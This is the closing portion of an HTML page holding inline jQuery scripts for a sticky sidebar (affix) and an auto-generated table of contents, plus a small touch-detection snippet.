            clearInterval(interval);
          }, 45000);
          window.pageLoad.then(function() {
            setTimeout(function() {
              clearInterval(interval);
              clearTimeout(timeout);
            }, 3000);
          });
          $scrollTarget.on('scroll', function() {
            disabled || setState();
          });
          $window.on('resize', function() {
            disabled || (calc(true), setState());
          });
          hasInit = true;
        }
      }

      setOptions(options);
      if (!disabled) {
        init();
      }
      $window.on('resize', window.throttle(function() {
        init();
      }, 200));
      return {
        setOptions: setOptions,
        refresh: function() {
          calc(true, { animation: false }); setState();
        }
      };
    }
    $.fn.affix = affix;
  });
})();
(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    function toc(options) {
      var $root = this, $window = $(window), $scrollTarget, $scroller, $tocUl = $('<ul class="toc toc--ellipsis"></ul>'), $tocLi, $headings, $activeLast, $activeCur,
        selectors = 'h1,h2,h3', container = 'body', scrollTarget = window, scroller = 'html, body', disabled = false,
        headingsPos, scrolling = false, hasRendered = false, hasInit = false;

      function setOptions(options) {
        var _options = options || {};
        _options.selectors && (selectors = _options.selectors);
        _options.container && (container = _options.container);
        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
        _options.scroller && (scroller = _options.scroller);
        _options.disabled !== undefined && (disabled = _options.disabled);
        $headings = $(container).find(selectors).filter('[id]');
        $scrollTarget = $(scrollTarget);
        $scroller = $(scroller);
      }
      function calc() {
        headingsPos = [];
        $headings.each(function() {
          headingsPos.push(Math.floor($(this).position().top));
        });
      }
      function setState(element, disabled) {
        var scrollTop = $scrollTarget.scrollTop(), i;
        if (disabled || !headingsPos || headingsPos.length < 1) { return; }
        if (element) {
          $activeCur = element;
        } else {
          for (i = 0; i < headingsPos.length; i++) {
            if (scrollTop >= headingsPos[i]) {
              $activeCur = $tocLi.eq(i);
            } else {
              $activeCur || ($activeCur = $tocLi.eq(i));
              break;
            }
          }
        }
        $activeLast && $activeLast.removeClass('active');
        ($activeLast = $activeCur).addClass('active');
      }
      function render() {
        if(!hasRendered) {
          $root.append($tocUl);
          $headings.each(function() {
            var $this = $(this);
            $tocUl.append($('<li></li>').addClass('toc-' + $this.prop('tagName').toLowerCase())
              .append($('<a></a>').text($this.text()).attr('href', '#' + $this.prop('id'))));
          });
          $tocLi = $tocUl.children('li');
          $tocUl.on('click', 'a', function(e) {
            e.preventDefault();
            var $this = $(this);
            scrolling = true;
            setState($this.parent());
            $scroller.scrollToAnchor($this.attr('href'), 400, function() {
              scrolling = false;
            });
          });
        }
        hasRendered = true;
      }
      function init() {
        var interval, timeout;
        if(!hasInit) {
          render(); calc(); setState(null, scrolling);
          // run calc every 100 millisecond
          interval = setInterval(function() {
            calc();
          }, 100);
          timeout = setTimeout(function() {
            clearInterval(interval);
          }, 45000);
          window.pageLoad.then(function() {
            setTimeout(function() {
              clearInterval(interval);
              clearTimeout(timeout);
            }, 3000);
          });
          $scrollTarget.on('scroll', function() {
            disabled || setState(null, scrolling);
          });
          $window.on('resize', window.throttle(function() {
            if (!disabled) {
              render(); calc(); setState(null, scrolling);
            }
          }, 100));
        }
        hasInit = true;
      }

      setOptions(options);
      if (!disabled) {
        init();
      }
      $window.on('resize', window.throttle(function() {
        init();
      }, 200));
      return {
        setOptions: setOptions
      };
    }
    $.fn.toc = toc;
  });
})();
/*(function () {

})();*/
</script><script>
  /* toc must before affix, since affix need to konw toc' height. */(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  var TOC_SELECTOR = window.TEXT_VARIABLES.site.toc.selectors;
  window.Lazyload.js(SOURCES.jquery, function() {
    var $window = $(window);
    var $articleContent = $('.js-article-content');
    var $tocRoot = $('.js-toc-root'), $col2 = $('.js-col-aside');
    var toc;
    var tocDisabled = false;
    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
    var hasToc = $articleContent.find(TOC_SELECTOR).length > 0;

    function disabled() {
      return $col2.css('display') === 'none' || !hasToc;
    }

    tocDisabled = disabled();

    toc = $tocRoot.toc({
      selectors: TOC_SELECTOR,
      container: $articleContent,
      scrollTarget: hasSidebar ? '.js-page-main' : null,
      scroller: hasSidebar ? '.js-page-main' : null,
      disabled: tocDisabled
    });

    $window.on('resize', window.throttle(function() {
      tocDisabled = disabled();
      toc && toc.setOptions({
        disabled: tocDisabled
      });
    }, 100));

  });
})();
(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    var $window = $(window), $pageFooter = $('.js-page-footer');
    var $pageAside = $('.js-page-aside');
    var affix;
    var tocDisabled = false;
    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');

    affix = $pageAside.affix({
      offsetBottom: $pageFooter.outerHeight(),
      scrollTarget: hasSidebar ? '.js-page-main' : null,
      scroller: hasSidebar ? '.js-page-main' : null,
      scroll: hasSidebar ? $('.js-page-main').children() : null,
      disabled: tocDisabled
    });

    $window.on('resize', window.throttle(function() {
      affix && affix.setOptions({
        disabled: tocDisabled
      });
    }, 100));

    window.pageAsideAffix = affix;
  });
})();
</script>
    </div>
    <script>(function () {
  var $root = document.getElementsByClassName('root')[0];
  if (window.hasEvent('touchstart')) {
    $root.dataset.isTouch = true;
    document.addEventListener('touchstart', function(){}, false);
  }
})();
</script>
  </body>
</html>

